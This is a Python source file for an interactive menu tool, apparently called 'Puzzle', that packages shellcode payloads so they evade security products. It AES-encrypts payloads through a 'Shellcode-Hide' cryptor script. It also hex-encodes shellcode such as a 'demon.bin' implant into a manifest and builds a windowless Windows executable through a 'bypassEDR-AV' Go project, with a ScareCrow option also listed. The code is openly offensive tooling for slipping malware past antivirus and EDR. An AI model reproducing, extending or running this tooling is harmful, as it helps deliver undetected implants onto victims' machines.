import questionary
import re
import sys
import subprocess
import os
from questionary import Style

def process_shellcode_and_update_manifest(shellcode_file, manifest_path):
    """
    Reads a shellcode binary file, converts it to a continuous hex string, and replaces 
    the placeholder in the manifest file with the formatted shellcode.
    """
    try:
        # Read the shellcode file as binary
        with open(shellcode_file, 'rb') as f:
            content = f.read()
        
        # Convert binary content to a continuous hex string
        formatted_shellcode = content.hex()
        print(f"Extracted shellcode: {formatted_shellcode[:50]}...")  # Print first 50 characters for verification

        # Read the manifest file
        with open(manifest_path, 'r') as f:
            manifest_content = f.read()

        # Replace the placeholder in the manifest file
        updated_manifest_content = re.sub(
            r"#!.*\$!", 
            f"#!{formatted_shellcode}$!", 
            manifest_content, 
            flags=re.DOTALL  # Allow multiline matching
        )

        # Write the updated content back to the manifest file
        with open(manifest_path, 'w') as f:
            f.write(updated_manifest_content)

        print("Manifest updated successfully.")
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

def exe():
    # Display Choices for Encryption Type
    choice = questionary.select(
        "Select EXE Payload Encryption Type:",
        choices=["AES", "NULL", "Exit"],
        style=custom_style
    ).ask()
    if choice == "AES":
        aes()

def aes():
    # Define the directory
    directory = "/app/payloads"

    # Check if the directory exists
    if not os.path.exists(directory):
        print(f"Directory '{directory}' does not exist.")
        return

    # Display all files in the directory
    files = [file for file in os.listdir(directory) if os.path.isfile(os.path.join(directory, file))]

    # Check if there are files in the directory
    if not files:
        print("No files found in the directory.")
        return

    # Use Questionary to let the user select a file
    selected_file = questionary.select(
        "Select a file:",
        choices=files
    ).ask()

    # Store the user's choice in a variable
    if selected_file:
        selected_file_path = os.path.join(directory, selected_file)
        print(f"Payload selected: {selected_file_path}")
        # Run the Packer Script against the payload
        command = f"python Shellcode-Hide/3\\ -\\ Encrypting/1\\ -\\ AES/AES_cryptor.py {selected_file_path}"
        #command = "ls -lah"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        # Print output
        print(result.stdout)

def shellcode():
    print("Shellcode option selected.")  # Add logic for shellcode if needed
    # Define the directory
    directory = "/app/payloads"

    # Check if the directory exists
    if not os.path.exists(directory):
        print(f"Directory '{directory}' does not exist.")
        return

    # Display all files in the directory
    files = [file for file in os.listdir(directory) if os.path.isfile(os.path.join(directory, file))]

    # Check if there are files in the directory
    if not files:
        print("No files found in the directory.")
        return

    # Use Questionary to let the user select a file
    selected_file = questionary.select(
        "Select a file:",
        choices=files
    ).ask()

    # Store the user's choice in a variable
    if selected_file:
        selected_file_path = os.path.join(directory, selected_file)
        print(f"Payload selected: {selected_file_path}")

    # Ask User to Choose Shellcode Technique
    custom_style = Style([("choice", "fg:blue")])  # Choices will appear in blue

    choice = questionary.select(
        "Shellcode Obfuscation Technique:",
        choices=["AVBypass Manifest", "ScareCrow", "Exit"],
        style=custom_style
    ).ask()

    process_shellcode_and_update_manifest(
       shellcode_file=selected_file_path,  # Use the selected file as the shellcode_file
       manifest_path="bypassEDR-AV/manifiesto.txt"
     )

    # ##################AVBypass
    if choice == "AVBypass Manifest":
        # Ensure demon.bin is present (WORKING)
        command = f"ls payloads"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        print(result.stdout)

        # Set gopath
        command = f"export PATH=$PATH:$HOME/go/bin"
        
        # Change the current working directory to bypassEDR-AV
        try:
            os.chdir("bypassEDR-AV")
            print(f"Changed working directory to: {os.getcwd()}")
        except FileNotFoundError:
            print("Error: bypassEDR-AV directory not found.")
            exit(1)

        # Step 1: Update manifest
        command = "python3 update_manifest.py"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        print(result.stdout)
        print(result.stderr)

        # Step 2: Update RSC
        command = "rsrc -manifest manifiesto.txt"

        # Step 3: Build the payload
        command = '''GOOS=windows GOARCH=amd64 /usr/bin/go build -ldflags="-H=windowsgui -s -w"'''
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        # Copy payload back a directory
        command = f"cp edr.exe ../payloads/payload.exe"
       
        # Check if edr.exe successfully built
        if os.path.isfile("edr.exe"):
            print("\033[32m[+] Payload successfully generated, saved to payloads/payload.exe\033[0m")
        else:
            print("[-] Payload failed to generate")

ascii_art = r"""
+-------------------------------------------------------------+
|                                                             |
|   __________ ____ _______________________.____ ___________  |
|   \______   \    |   \____    /\____    /|    |\_   _____/  |
|    |     ___/    |   / /     /   /     / |    | |    __)_   |
|    |    |   |    |  / /     /_  /     /_ |    | |        \  |
|    |____|   |______/ /_______ \/_______ \|____|/_______  /  |
|                          \/        \/        \/          \/ |
|                                                             |
|                        PUZZLE                               |
+-------------------------------------------------------------+
"""

print(f"\033[35m{ascii_art}\033[0m")

custom_style = Style([("choice", "fg:blue")])  # Choices will appear in blue

choice = questionary.select(
    "Payload Type:",
    choices=["EXE", "Shellcode", "Exit"],
    style=custom_style
).ask()

if choice == "EXE":
    print("Creating EXE from Shellcode...")
    exe()
elif choice == "Shellcode":
    print("Creating Shellcode...")
    shellcode()
elif choice == "Exit":
    print("Exiting the program. Goodbye!")
